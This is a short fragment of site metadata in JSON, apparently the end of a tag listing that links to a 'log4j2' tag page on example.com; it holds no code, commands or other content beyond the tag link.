2","permalink":"http://example.com/tags/log4j2/"}]}